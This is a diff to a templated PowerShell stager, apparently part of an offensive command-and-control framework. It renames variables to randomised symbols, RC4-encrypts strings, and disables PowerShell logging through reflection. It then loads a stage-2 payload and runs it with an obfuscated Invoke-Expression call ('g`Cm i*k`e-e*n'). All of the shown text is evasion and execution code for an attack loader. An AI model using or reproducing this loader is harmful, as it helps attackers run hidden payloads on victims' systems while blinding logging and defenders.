@@ -28,7 +28,7 @@ function {{symbol_name("Decrypt-String")}} {
 ${{symbol_name("clip_entry")}} = "{{exec_clipboard_entry|rc4encrypt}}"
 
 {% for s in strings %}
-    $string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
+    ${{symbol_name("obfuscated_str")}}{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
 {% endfor %}
 
 
@@ -39,9 +39,9 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
     {% endif %}
 
     {# Disable Logging #}
-    $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
-    $settings[$string5] = @{}
-    $settings[$string5].Add($string6, "0")
+    ${{symbol_name("settings")}} = [Ref].Assembly.GetType(${{symbol_name("obfuscated_str")}}2).GetField(${{symbol_name("obfuscated_str")}}3,${{symbol_name("obfuscated_str")}}4).GetValue($null);
+    ${{symbol_name("settings")}}[${{symbol_name("obfuscated_str")}}5] = @{}
+    ${{symbol_name("settings")}}[${{symbol_name("obfuscated_str")}}5].Add(${{symbol_name("obfuscated_str")}}6, "0")
 }
 
 
@@ -62,4 +62,4 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 ${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "{{stage2}}"
 
 {#clever obfuscation#}
-& (gcm i*k`e-e*n) ${{symbol_name("Code")}}
+& (g`Cm i*k`e-e*n) ${{symbol_name("Code")}}
